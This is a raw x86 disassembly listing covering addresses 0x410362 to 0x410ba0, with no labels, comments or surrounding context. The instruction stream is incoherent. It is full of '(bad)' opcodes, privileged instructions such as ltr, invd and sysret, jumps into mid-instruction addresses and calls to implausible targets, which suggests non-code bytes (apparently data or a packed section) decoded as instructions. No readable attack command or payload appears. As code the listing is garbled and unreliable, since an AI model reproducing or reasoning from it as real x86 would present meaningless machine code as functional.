  410362:	call   0x77a78f27
  410367:	inc    ebp
  410368:	mov    DWORD PTR [eax+0x9d4f0c],edi
  41036e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410374:	add    BYTE PTR [esi+0x7d],ah
  410377:	inc    ebp
  410378:	mov    bx,WORD PTR [ebp+0x8]
  41037c:	add    DWORD PTR [ebp+0x56],0x30c008b
  410383:	inc    ebp
  410384:	mov    bx,di
  410387:	lock test BYTE PTR [ecx+0x7000801],bh
  41038e:	jge    0x410351
  410390:	mov    ecx,DWORD PTR [ebx-0x620613f0]
  410396:	cli    
  410397:	xor    bl,bh
  410399:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41039f:	test   BYTE PTR [eax],cl
  4103a1:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4103a8:	cmp    ebp,eax
  4103aa:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4103b1:	test   BYTE PTR [ebp+0x1],bh
  4103b4:	mov    ebx,0x458a00
  4103b9:	xor    esi,DWORD PTR [ebx]
  4103bb:	add    esp,DWORD PTR [esi-0x77]
  4103be:	pop    ebp
  4103bf:	loopne 0x410427
  4103c1:	inc    ebp
  4103c2:	clc    
  4103c3:	xor    edi,DWORD PTR [ebx]
  4103c5:	add    esi,DWORD PTR [edx-0x77]
  4103c8:	data16 fdivr QWORD PTR [ebp-0x49]
  4103cc:	mov    ebx,0xb78afc
  4103d1:	hlt    
  4103d2:	xor    eax,DWORD PTR [eax+0x66]
  4103d5:	add    BYTE PTR [ebp+0x66],bl
  4103d8:	data16 lock clc 
  4103db:	inc    eax
  4103dc:	cmp    eax,DWORD PTR [eax]
  4103de:	ja     0x410446
  4103e0:	psubq  mm7,QWORD PTR [ebp+0x6]
  4103e4:	ltr    WORD PTR [ebp+0x66]
  4103e8:	add    esi,eax
  4103ea:	add    di,WORD PTR [ebp+0x2b]
  4103ee:	data16 data16 jge 0x41046f
  4103f2:	mov    ebx,0xe08a8b
  4103f7:	jge    0x41042c
  4103f9:	data16 data16 xor al,0x5d
  4103fd:	data16 data16 jne 0x4103f9
  410401:	mov    edi,DWORD PTR [ebx]
  410403:	fdiv   QWORD PTR [edx+0x7d]
  410406:	data16 data16 jge 0x41043e
  41040a:	mov    ebx,0x758a66
  41040f:	mov    esi,0x667233
  410414:	pop    ebp
  410415:	or     BYTE PTR [esi+0x0],ah
  410418:	clc    
  410419:	mov    edi,DWORD PTR [ebx]
  41041b:	lock ja 0x4103a9
  41041e:	(bad)  
  410420:	jge    0x410419
  410422:	invd   
  410424:	pop    ebp
  410425:	add    BYTE PTR [ebx],al
  410427:	(bad)  
  410428:	cmp    di,WORD PTR [ebp+0xf]
  41042c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  410430:	mov    bx,WORD PTR [ebp-0x10]
  410434:	pop    bp
  410436:	fbstp  TBYTE PTR [ebx]
  410438:	test   DWORD PTR [ebx],eax
  41043a:	add    BYTE PTR [ebx],bh
  41043c:	add    BYTE PTR [esi+0x7d],ah
  41043f:	jge    0x4103cc
  410441:	data16 in al,dx
  410443:	pop    ebp
  410444:	stc    
  410445:	bsf    ecx,DWORD PTR [ebp+0x6632009d]
  41044c:	mov    edi,ebx
  41044e:	in     al,dx
  41044f:	test   BYTE PTR [ebp+0x0],bh
  410452:	mov    eax,DWORD PTR [eax]
  410454:	call   0xbd3dfde4
  410459:	inc    eax
  41045a:	popf   
  41045b:	add    BYTE PTR [edx],dh
  41045d:	mov    bx,di
  410460:	call   0x8b4981f0
  410465:	add    ebp,esp
  410467:	mov    bx,di
  41046a:	jnp    0x410492
  41046c:	mov    DWORD PTR [ebx+0x407df808],ecx
  410472:	mov    eax,DWORD PTR [eax]
  410474:	call   0x7c3c8fdf
  410479:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41047f:	data16 data16 fistp WORD PTR [ebp+0xe]
  410484:	xor    DWORD PTR [edi-0x48fff7aa],0xfb66f403
  41048e:	fisttp WORD PTR [ecx-0x7401f77b]
  410494:	(bad)  
  410495:	cld    
  410496:	jne    0x4104d8
  410498:	xor    eax,DWORD PTR [eax]
  41049a:	mov    esp,DWORD PTR [esi-0x10]
  41049d:	sti    
  41049e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4104a5:	data16 adc bl,bh
  4104a8:	push   ebp
  4104a9:	xor    ecx,DWORD PTR es:[ebx+0x40e4f88b]
  4104b0:	mov    WORD PTR [eax],es
  4104b2:	popf   
  4104b3:	data16 xor bh,bl
  4104b6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4104bc:	mov    esp,DWORD PTR [esi-0x14]
  4104bf:	fisttp WORD PTR [ebx-0x3748a9f2]
  4104c5:	or     al,0x2b
  4104c7:	mov    bh,0xba
  4104c9:	hlt    
  4104ca:	mov    bh,bl
  4104cc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4104d2:	dec    esi
  4104d3:	or     al,0x0
  4104d5:	mov    edi,DWORD PTR [ebx]
  4104d7:	or     BYTE PTR [ebp+0x3b],dh
  4104da:	mov    ecx,DWORD PTR [edi]
  4104dc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4104e2:	xor    al,0xd8
  4104e4:	pop    bp
  4104e6:	lock xor esi,DWORD PTR [ebx]
  4104e9:	lea    esp,[esi+0x1f]
  4104ec:	icebp  
  4104ed:	jb     0x4104f3
  4104ef:	add    al,al
  4104f1:	jge    0x4104ff
  4104f3:	mov    eax,eax
  4104f5:	fsubr  st,st(3)
  4104f7:	pop    ebp
  4104f8:	mov    esi,DWORD PTR [ebx]
  4104fa:	in     al,0x8d
  4104fc:	rcr    DWORD PTR [edi],0xc2
  4104ff:	jb     0x41055f
  410501:	add    cl,cl
  410503:	jge    0x410511
  410505:	mov    edx,DWORD PTR [ebp-0x20]
  410508:	in     al,dx
  410509:	pop    ebp
  41050a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  41050f:	cmp    di,WORD PTR [ebp+0x0]
  410513:	mov    ebp,DWORD PTR [ebx]
  410515:	fdivr  QWORD PTR [esi+0x668a5d]
  41051b:	cmp    al,0x33
  41051d:	mov    si,0x4e7d
  410521:	mov    eax,DWORD PTR [eax]
  410523:	lock inc ebp
  410525:	mov    esi,DWORD PTR [eax+ecx*1]
  410528:	pushf  
  410529:	idiv   DWORD PTR [edx-0x7ff7af8]
  41052f:	(bad)  
  410530:	cmp    edi,DWORD PTR [ebx]
  410532:	je     0x410543
  410534:	push   ebx
  410535:	loopne 0x410546
  410537:	dec    ecx
  410539:	mov    esp,DWORD PTR [ebx-0x1c]
  41053c:	int    0xf1
  41053e:	mov    esi,0x703084d
  410543:	movlhps xmm6,xmm1
  410546:	add    BYTE PTR [ebp+0x66],dh
  410549:	jmp    0x410516
  41054b:	mov    eax,DWORD PTR [ebx]
  41054d:	lock push ebp
  41054f:	ror    DWORD PTR [ebp-0x2972feb3],1
  410555:	or     bh,dl
  410557:	jb     0x410557
  410559:	add    BYTE PTR [ebx-0x1a7487b3],cl
  41055f:	loopne 0x410561
  410561:	jne    0x410569
  410563:	data16 add BYTE PTR [esi+eiz*2],dh
  410567:	mov    ecx,ebx
  410569:	inc    ax
  41056b:	icebp  
  41056c:	add    BYTE PTR [eax+0x66],al
  41056f:	add    bl,cl
  410571:	mov    dx,0xf2
  410575:	mov    edx,0x66cb0066
  41057a:	enter  0x4df1,0x19
  41057e:	pop    edi
  41057f:	jne    0x410502
  410581:	mov    esi,DWORD PTR [eax+ebp*8]
  410584:	pushf  
  410585:	mov    esi,DWORD PTR [edi+esi*2+0x33]
  410589:	sub    ecx,DWORD PTR [ebp-0x1a0db79a]
  41058f:	cmp    eax,DWORD PTR [eax]
  410591:	jne    0x41055c
  410593:	xor    edx,DWORD PTR [ebp-0x15]
  410596:	in     al,dx
  410597:	xor    edx,DWORD PTR [esi+0x40]
  41059a:	mov    DWORD PTR [edi],0x338545fc
  4105a0:	clc    
  4105a1:	add    esi,DWORD PTR ds:0xe85b9c5f
  4105a7:	ret    0xff
  4105aa:	dec    DWORD PTR [ebx-0x74f8ae08]
  4105b0:	ss push esi
  4105b2:	dec    eax
  4105b3:	push   es
  4105b4:	jle    0x4105b6
  4105b6:	popa   
  4105b7:	data16 (bad) 
  4105b9:	into   
  4105ba:	arpl   WORD PTR [eax-0x33],ax
  4105bd:	add    BYTE PTR [ecx+0x7ce0866],bh
  4105c3:	mov    edx,0xc7000066
  4105c8:	push   es
  4105c9:	cld    
  4105ca:	add    BYTE PTR [ebp+0x35c3f866],al
  4105d0:	inc    eax
  4105d1:	pushf  
  4105d2:	add    BYTE PTR [esi+0x66],ah
  4105d5:	into   
  4105d6:	ret    
  4105d7:	pop    ebp
  4105d8:	push   0x66b70057
  4105dd:	mov    edi,0xff038dc3
  4105e2:	jne    0x41063a
  4105e4:	lea    edx,[ecx+0x1]
  4105e7:	mov    ebx,0xd64ff1
  4105ec:	sar    DWORD PTR [ebx],1
  4105ee:	test   BYTE PTR [ebp+0x3a],dh
  4105f1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4105f5:	push   edi
  4105f6:	xor    BYTE PTR [ebx],0x36
  4105f9:	mov    esi,ebx
  4105fb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  410601:	cmp    al,BYTE PTR [ebp+0x64]
  410604:	pop    ebx
  410605:	mov    ebx,0x9c3b34
  41060a:	je     0x410637
  41060c:	xor    edi,DWORD PTR [ebx+0x668a33]
  410612:	mov    WORD PTR [ebx],?
  410614:	cmp    bh,BYTE PTR [ebx+0x8b4e64]
  41061a:	pop    edi
  41061b:	cmp    ecx,ecx
  41061d:	jne    0x410674
  41061f:	mov    ebp,esp
  410621:	cld    
  410622:	push   esi
  410623:	pop    ebx
  410624:	inc    ebp
  410625:	stc    
  410626:	xor    al,0x85
  410628:	pushf  
  410629:	clc    
  41062a:	mov    esi,0xf8ce8509
  41062f:	test   dl,dl
  410631:	cmp    al,0xff
  410633:	fs pop si
  410636:	or     bl,al
  410638:	push   es
  410639:	mov    eax,DWORD PTR [eax]
  41063b:	push   ecx
  41063c:	push   di
  41063e:	retf   0x4045
  410641:	xor    al,0x0
  410643:	pushf  
  410644:	mov    si,0x85ca
  410648:	mov    edx,0x665b00f8
  41064d:	dec    edx
  41064f:	mov    edx,DWORD PTR [edi-0x76]
  410652:	push   edi
  410653:	add    al,0xb7
  410655:	xor    al,0xba
  410657:	cmp    al,0x8d
  410659:	je     0x41065a
  41065b:	mov    edx,DWORD PTR [esi-0x46]
  41065e:	push   ecx
  41065f:	lea    edi,[ebx+0x564fff]
  410665:	push   ecx
  410666:	cmp    edx,DWORD PTR [ebx+0x75]
  410669:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41066f:	add    BYTE PTR [ebx],dh
  410671:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410677:	add    BYTE PTR [ebx+esi*1+0x4f64bb3a],cl
  41067e:	mov    ebx,0x3b3b00
  410683:	jne    0x4106b0
  410685:	mov    DWORD PTR [ebx+0x728afc],edi
  41068b:	xor    esi,DWORD PTR [ebx]
  41068d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410693:	push   edi
  410694:	cmp    esp,ebp
  410696:	jne    0x410698
  410698:	sbb    DWORD PTR [eax],0x8085c3fc
  41069e:	clc    
  41069f:	dec    eax
  4106a0:	pop    ebx
  4106a1:	sti    
  4106a2:	add    eax,0xeb8bc075
  4106a7:	cld    
  4106a8:	xor    edi,DWORD PTR ds:0xf8c3855e
  4106ae:	mov    ecx,DWORD PTR [ecx+edx*2]
  4106b1:	rol    DWORD PTR [ebp-0x37],0xf
  4106b5:	mov    DWORD PTR [eax],ecx
  4106b7:	inc    edi
  4106b8:	(bad)  
  4106b9:	in     eax,0xfa
  4106bb:	add    bh,bh
  4106bd:	(bad)  
  4106be:	mov    esi,0xc38a5e
  4106c3:	mov    esi,DWORD PTR [ebx]
  4106c5:	push   ecx
  4106c6:	mov    edi,0xfc4ec7
  4106cb:	test   DWORD PTR [ebp-0x8],edx
  4106ce:	xor    ax,0x9cc7
  4106d2:	sub    ebp,eax
  4106d4:	inc    ebp
  4106d5:	(bad)  
  4106d6:	sub    edi,edi
  4106d8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4106de:	inc    ebp
  4106df:	add    BYTE PTR [esi+0x2b],ah
  4106e2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4106e8:	cmp    al,0x33
  4106ea:	mov    edi,DWORD PTR [edx+0xfa4e81]
  4106f0:	(bad)  
  4106f1:	cmp    esi,DWORD PTR [ebx]
  4106f3:	je     0x4106ad
  4106f5:	push   ebx
  4106f6:	dec    esi
  4106f7:	str    ecx
  4106fa:	cmp    esp,DWORD PTR [ebx+0x75]
  4106fd:	int    0x33
  4106ff:	mov    edi,0x789085f
  410704:	mov    ebp,DWORD PTR [eax-0x4]
  410707:	add    cl,cl
  410709:	data16 add al,0xcb
  41070c:	push   ebp
  41070d:	add    ebp,esp
  41070f:	jne    0x4106fd
  410711:	(bad)  
  410712:	mov    DWORD PTR [ecx],0xd685f7ec
  410718:	clc    
  410719:	xlat   BYTE PTR ds:[ebx]
  41071a:	inc    ebp
  41071b:	mov    esi,DWORD PTR [edx]
  41071d:	push   eax
  41071e:	pushf  
  41071f:	in     eax,0x8b
  410721:	add    ah,ch
  410723:	push   es
  410724:	push   esi
  410725:	add    BYTE PTR [ecx+0x66],dl
  410728:	add    eax,0x4072cb
  41072d:	add    BYTE PTR [ebp+0x66],al
  410730:	(bad)  
  410731:	retf   
  410732:	lock mov edx,0x66f80085
  410738:	inc    ebp
  410739:	retf   
  41073a:	xor    eax,ecx
  41073c:	pushf  
  41073d:	jge    0x410706
  41073f:	xor    al,0xfc
  410741:	pushf  
  410742:	test   DWORD PTR [edi-0x8],ebx
  410745:	je     0x41078c
  410747:	xor    esi,DWORD PTR ds:0x7020840
  41074d:	ror    BYTE PTR [ebp-0x37],0x8d
  410751:	push   ebp
  410752:	add    esp,ebp
  410754:	jb     0x4106e1
  410756:	add    BYTE PTR [eax],cl
  410758:	dec    ebp
  410759:	mov    bh,0x81
  41075b:	push   esi
  41075c:	push   esi
  41075d:	adc    DWORD PTR [ecx-0x3c],0x409dff81
  410764:	xor    al,BYTE PTR [eax]
  410766:	mov    edx,DWORD PTR [edi+0x10]
  410769:	(bad)  
  41076a:	scas   eax,DWORD PTR es:[edi]
  41076b:	mov    edx,0x890f003b
  410770:	in     eax,dx
  410771:	cld    
  410772:	add    BYTE PTR [ebx],bh
  410774:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410778:	dec    ebp
  410779:	or     BYTE PTR [ebx],ch
  41077b:	ret    0x458b
  41077e:	lock jmp 0x410772
  410781:	mov    ecx,DWORD PTR [eax]
  410783:	or     BYTE PTR [edi],al
  410785:	mov    ecx,eax
  410787:	xor    DWORD PTR [edx+0x2],0x0
  41078b:	mov    bh,0xc1
  41078d:	adc    BYTE PTR [eax],dh
  41078f:	iret   
  410790:	inc    ebp
  410791:	mov    DWORD PTR [ebx],0x4dfff8c4
  410797:	inc    BYTE PTR [ebx]
  410799:	mov    edx,0x661100f8
  41079e:	adc    al,bh
  4107a0:	dec    ecx
  4107a1:	fisttp WORD PTR [ecx+0x456604c0]
  4107a7:	add    dh,BYTE PTR ds:0x75e0845
  4107ad:	ret    0x4d
  4107b0:	lea    ecx,[ebx+0x18728301]
  4107b6:	add    BYTE PTR [ebp+0x45],al
  4107b9:	xor    eax,0xc7009ce9
  4107be:	add    al,ch
  4107c0:	inc    ebp
  4107c1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4107c7:	xor    eax,0x781084d
  4107cc:	push   esi
  4107cd:	popf   
  4107ce:	push   ecx
  4107cf:	xor    al,BYTE PTR [ecx+0x32f89d89]
  4107d5:	inc    ebp
  4107d6:	cmp    edi,DWORD PTR ds:0xc78b9c76
  4107dc:	or     ah,dh
  4107de:	inc    ebp
  4107df:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4107e5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4107eb:	in     al,dx
  4107ec:	hlt    
  4107ed:	push   esi
  4107ee:	push   esi
  4107ef:	push   ecx
  4107f0:	push   ecx
  4107f1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4107f7:	popf   
  4107f8:	popf   
  4107f9:	xor    dh,BYTE PTR [edx]
  4107fb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  410801:	or     BYTE PTR [ebp+0x7],al
  410804:	mov    eax,ecx
  410806:	clc    
  410807:	jb     0x4107ca
  410809:	add    BYTE PTR [ebp+0x55],cl
  41080c:	or     DWORD PTR [edi],0xc251d156
  410812:	add    DWORD PTR [ebx+0x32009d],0x8b76453b
  41081c:	mov    edi,eax
  41081e:	or     cl,al
  410820:	inc    ebp
  410821:	dec    ebp
  410822:	mov    eax,DWORD PTR [ecx+0x514d560c]
  410828:	or     WORD PTR [ecx],0x899d
  41082d:	xor    cl,BYTE PTR [ebx+0x5676fc3b]
  410833:	mov    edx,DWORD PTR [ecx+0x8]
  410836:	mov    eax,DWORD PTR [ebp-0x8]
  410839:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb263]
  410840:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  410846:	inc    ebp
  410847:	dec    eax
  410848:	add    ecx,DWORD PTR [ebx+0x564df0f8]
  41084e:	add    edx,DWORD PTR [ecx-0x8]
  410851:	mov    ecx,DWORD PTR [ecx]
  410853:	clc    
  410854:	or     BYTE PTR [ebp+eax*2+0x4532409d],al
  41085b:	mov    ecx,ebp
  41085d:	clc    
  41085e:	(bad)  
  41085f:	popf   
  410860:	inc    DWORD PTR [eax]
  410862:	ret    0x8b
  410865:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  41086b:	mov    edi,esp
  41086d:	hlt    
  41086e:	test   ecx,esi
  410870:	clc    
  410871:	or     BYTE PTR [ebp+0x7],al
  410874:	xor    al,cl
  410876:	pushf  
  410877:	jb     0x4108ac
  410879:	add    BYTE PTR [eax-0x3f],al
  41087c:	inc    eax
  41087d:	daa    
  41087e:	inc    ebp
  41087f:	inc    ebp
  410880:	xor    eax,0x7f80803
  410885:	dec    ebp
  410886:	popf   
  410887:	add    esi,DWORD PTR [edx]
  410889:	clc    
  41088a:	cmp    DWORD PTR [ecx],ecx
  41088c:	or     al,0x8
  41088e:	add    al,BYTE PTR [ebp+0x2c]
  410891:	xor    eax,0x7350845
  410896:	or     BYTE PTR [ebp+0x7],cl
  410899:	lea    ebx,[ebp-0x748dcdff]
  41089f:	add    BYTE PTR [eax*2-0x74b21438],cl
  4108a6:	mov    edx,DWORD PTR [eax]
  4108a8:	cld    
  4108a9:	dec    ebp
  4108aa:	push   esi
  4108ab:	sub    edx,DWORD PTR [ecx-0x75]
  4108ae:	add    eax,0xf172fc
  4108b3:	or     BYTE PTR [ebp+0x7],cl
  4108b6:	add    eax,ecx
  4108b8:	or     al,0x72
  4108ba:	add    DWORD PTR [eax],eax
  4108bc:	mov    ebx,0x29c2c1
  4108c1:	inc    ebp
  4108c2:	mov    eax,DWORD PTR [ebx]
  4108c4:	cmp    eax,0x3004d1c
  4108ca:	xbegin 0x66c694c4
  4108d0:	clc    
  4108d1:	or     BYTE PTR [ebp+0x45],al
  4108d4:	xor    dh,BYTE PTR ds:0x78b089c
  4108da:	adc    BYTE PTR [ebp+0x45],cl
  4108dd:	lea    eax,[ebp+0x33727501]
  4108e3:	add    cl,ch
  4108e5:	inc    ebp
  4108e6:	add    bl,ch
  4108e8:	add    BYTE PTR [ebx+0x45850845],cl
  4108ee:	je     0x41087b
  4108f0:	push   ebx
  4108f1:	or     al,0x85
  4108f3:	dec    ebp
  4108f4:	std    
  4108f5:	mov    bh,bh
  4108f7:	mov    BYTE PTR [ebp-0x75],al
  4108fa:	mov    edi,eax
  4108fc:	or     al,0x89
  4108fe:	inc    ebp
  4108ff:	clc    
  410900:	mov    esp,esp
  410902:	hlt    
  410903:	call   DWORD PTR [edi-0x37]
  410906:	push   esi
  410907:	or     al,0x51
  410909:	push   ebp
  41090a:	xor    ebp,esp
  41090c:	mov    esi,0x457251
  410911:	xor    eax,0xc7459cc6
  410916:	mov    edi,eax
  410918:	or     al,0x85
  41091a:	add    al,bh
  41091c:	inc    eax
  41091e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  410922:	or     ah,bh
  410924:	inc    eax
  410925:	push   esi
  410926:	jmp    0x410979
  410928:	mov    eax,DWORD PTR ds:0xe8720c
  41092e:	mov    DWORD PTR [ebp-0x8],eax
  410931:	jne    0x410978
  410933:	jmp    0x4108c0
  410935:	mov    ebp,DWORD PTR [eax]
  410937:	clc    
  410938:	retf   0xff56
  41093b:	push   ecx
  41093c:	mov    DWORD PTR ds:0x757210,eax
  410942:	mov    ecx,DWORD PTR [ebp-0x4]
  410945:	sub    esp,DWORD PTR [ebx-0x77]
  410948:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41094f:	or     ah,bh
  410951:	pop    es
  410952:	ds popf 
  410954:	push   DWORD PTR [edx]
  410956:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41095c:	(bad)  
  41095d:	mov    bh,bh
  41095f:	jmp    0x41094d
  410961:	leave  
  410962:	jne    0x41096c
  410964:	call   0x2e02be
  410969:	in     al,dx
  41096a:	dec    ebp
  41096b:	add    dh,BYTE PTR [ebx]
  41096d:	add    BYTE PTR [ebx],al
  41096f:	inc    ebp
  410970:	cmp    esi,DWORD PTR ds:0xc78b9c74
  410976:	or     al,0xf0
  410978:	add    BYTE PTR [ebp+0x458bf845],al
  41097e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410984:	adc    al,0x7
  410986:	enter  0x9fc0,0xa5
  41098a:	rol    BYTE PTR [eax],0x5e
  41098d:	mov    ecx,ecx
  41098f:	or     al,0xc
  410991:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410998:	jmp    0x410999
  41099a:	push   ebp
  41099b:	mov    esp,ebp
  41099d:	cld    
  41099e:	inc    ebp
  41099f:	inc    ebp
  4109a0:	or     DWORD PTR [ecx+0x457dec10],0x0
  4109a7:	push   esi
  4109a8:	push   esi
  4109a9:	mov    edi,0x7af080f
  4109ae:	add    bh,al
  4109b0:	test   DWORD PTR [ebp+0x3a7320f],ebx
  4109b6:	add    BYTE PTR [ecx+0x4540100f],cl
  4109bc:	mov    ebp,eax
  4109be:	mov    ebp,edi
  4109c0:	lock call edx
  4109c3:	fcom   DWORD PTR [ebp+0x45]
  4109c6:	mov    eax,0x148a8b
  4109cb:	push   ecx
  4109cc:	enter  0xc145,0x83
  4109d0:	cmp    ecx,DWORD PTR [eax]
  4109d2:	add    BYTE PTR [ebp+0x4d],al
  4109d5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  4109db:	call   0xffa1054a
  4109e0:	cmp    eax,DWORD PTR [ebp-0xc]
  4109e3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  4109e7:	push   ebp
  4109e8:	(bad)  
  4109e9:	call   0x3207ed
  4109ee:	mov    bh,0xdb
  4109f0:	cld    
  4109f1:	or     BYTE PTR [ebp+0x45],bl
  4109f4:	(bad)  
  4109f5:	call   0xff7b0685
  4109fa:	add    al,BYTE PTR [ebp+0x37]
  4109fd:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  410a03:	jne    0x410a05
  410a05:	(bad)  
  410a06:	cmp    edi,esp
  410a08:	jne    0x410a3b
  410a0a:	mov    edi,edi
  410a0c:	or     BYTE PTR [ebx-0x307f0b49],cl
  410a12:	pop    ds
  410a13:	into   
  410a14:	je     0x4109d7
  410a16:	mov    ebx,DWORD PTR [esi]
  410a18:	or     BYTE PTR [ebp-0x49],al
  410a1b:	mov    esp,DWORD PTR [esi-0x77]
  410a1e:	mov    esi,0x6451f0c
  410a23:	mov    eax,DWORD PTR [eax]
  410a25:	or     al,0x66
  410a27:	sar    bl,0x3b
  410a2a:	xor    esi,DWORD PTR [ebp+0x66]
  410a2d:	xor    ecx,edi
  410a2f:	pop    edi
  410a30:	adc    bl,BYTE PTR [ebx+0x7e]
  410a33:	ret    0xff
  410a36:	cld    
  410a37:	inc    ebp
  410a38:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  410a3e:	cld    
  410a3f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  410a46:	push   0xffffff83
  410a48:	pop    edi
  410a49:	or     BYTE PTR [ebp+0x53],dh
  410a4c:	xorps  xmm1,xmm2
  410a4f:	test   BYTE PTR [eax+eax*1],bh
  410a52:	add    BYTE PTR [eax],al
  410a54:	adc    eax,eax
  410a56:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  410a5e:	jmp    DWORD PTR [eax]
  410a60:	ror    al,0x5e
  410a63:	inc    ebp
  410a64:	leave  
  410a65:	xor    ecx,DWORD PTR [eax]
  410a67:	and    DWORD PTR [ebx-0x3ebf0708],ecx
  410a6d:	add    ah,al
  410a6f:	xor    edi,edi
  410a71:	xor    DWORD PTR [ebx],0x66003306
  410a77:	mov    DWORD PTR [ebp-0xc],ecx
  410a7a:	pcmpgtw mm0,mm0
  410a7d:	add    dl,ah
  410a7f:	leave  
  410a80:	mov    esi,DWORD PTR [eax-0x7d]
  410a83:	push   ax
  410a85:	dec    ebp
  410a86:	mov    esi,DWORD PTR [ebx-0x75]
  410a89:	lea    ebp,[eax-0x7c00ff06]
  410a8f:	xor    eax,DWORD PTR [eax]
  410a91:	sysret 
  410a93:	dec    ebp
  410a94:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410a9b:	push   WORD PTR [ecx+0x8]
  410a9f:	jne    0x410a62
  410aa1:	ud0    ecx,DWORD PTR [ecx]
  410aa4:	mov    edi,DWORD PTR [edx+0x660000ac]
  410aaa:	(bad)  
  410aab:	iret   
  410aac:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410ab3:	cli    
  410ab4:	inc    ebp
  410ab5:	cmp    al,0x8d
  410ab7:	add    BYTE PTR [esi+0x2d],ah
  410aba:	inc    ebp
  410abb:	pop    ebp
  410abc:	lea    ecx,[edi]
  410abe:	mov    dl,bh
  410ac0:	add    BYTE PTR [edi],cl
  410ac2:	mov    DWORD PTR [eax+eax*8],edi
  410ac5:	mov    ebx,0x3b87
  410aca:	add    BYTE PTR [ebx],ch
  410acc:	inc    ebp
  410acd:	data16 (bad) 
  410acf:	clc    
  410ad0:	int3   
  410ad1:	cmp    eax,DWORD PTR [eax]
  410ad3:	je     0x410a5e
  410ad5:	push   0xffffffc8
  410ad7:	pop    edi
  410ad8:	xchg   DWORD PTR [ebp+0x0],eax
  410adb:	data16 add BYTE PTR [ebp+0x45],cl
  410adf:	lea    cx,[ebp+0x10]
  410ae3:	jb     0x410ae5
  410ae5:	jmp    0x410a70
  410ae7:	call   eax
  410ae9:	clc    
  410aea:	xchg   DWORD PTR [edi+0x1],edi
  410aed:	mov    eax,DWORD PTR [eax]
  410aef:	or     BYTE PTR [ebp-0x49],al
  410af2:	lea    eax,[eax+0x74003154]
  410af8:	push   edi
  410af9:	inc    edx
  410afa:	jge    0x410afb
  410afc:	mov    DWORD PTR [edi],ecx
  410afe:	fdiv   DWORD PTR [edi-0x6]
  410b01:	inc    DWORD PTR [eax]
  410b03:	xor    edx,DWORD PTR [eax+0x5f]
  410b06:	xchg   DWORD PTR [ebx+0x1],ebx
  410b09:	ret    0x0
  410b0c:	xor    BYTE PTR [ebp-0x51],cl
  410b0f:	cmp    edi,0xf0ff89fa
  410b15:	data16 ror al,0x84
  410b19:	rol    BYTE PTR [eax],0x3b
  410b1c:	add    al,dh
  410b1e:	dec    eax
  410b1f:	xchg   esp,eax
  410b20:	push   ebx
  410b21:	jmp    0x410aae
  410b23:	push   ebp
  410b24:	add    esp,ebp
  410b26:	add    ebp,esp
  410b28:	mov    edx,DWORD PTR [edi+0x24]
  410b2b:	clc    
  410b2c:	dec    esi
  410b2d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  410b33:	cmp    BYTE PTR [ebx],al
  410b35:	jne    0x410ac0
  410b37:	xor    esp,eax
  410b39:	jmp    0x440cbc
  410b3e:	add    ebp,DWORD PTR [ecx+ecx*4]
  410b41:	jne    0x410b37
  410b43:	call   0xffcb089d
  410b48:	clc    
  410b49:	xchg   edi,eax
  410b4a:	sti    
  410b4b:	add    DWORD PTR [ebx],eax
  410b4d:	add    BYTE PTR [ebp+0x47],bl
  410b50:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  410b56:	pop    ebp
  410b57:	mov    DWORD PTR [esi-0x48],esi
  410b5a:	jmp    0x410ba3
  410b5c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  410b62:	(bad)  
  410b64:	cmp    al,0x0
  410b66:	cmp    eax,DWORD PTR [ebp+0x18]
  410b69:	lea    ebx,[ebp-0x56]
  410b6c:	jle    0x410b6e
  410b6e:	jae    0x410af9
  410b70:	mov    eax,esp
  410b72:	call   0xb900:0x8b005587
  410b79:	inc    ebp
  410b7a:	push   ebp
  410b7b:	lea    ecx,[ebp-0x27ff4f12]
  410b81:	mov    eax,edi
  410b83:	int3   
  410b84:	push   ebp
  410b85:	xchg   edi,eax
  410b87:	add    esp,ebp
  410b89:	add    BYTE PTR [eax],al
  410b8b:	inc    ebp
  410b8c:	add    BYTE PTR [ebp+0x8b3255],cl
  410b92:	cld    
  410b93:	mov    DWORD PTR [edx],edi
  410b95:	aam    0x75
  410b97:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410b9d:	mov    DWORD PTR [ebx-0x50],edx
  410ba0:	test   BYTE PTR [ebp-0x1],0xe8
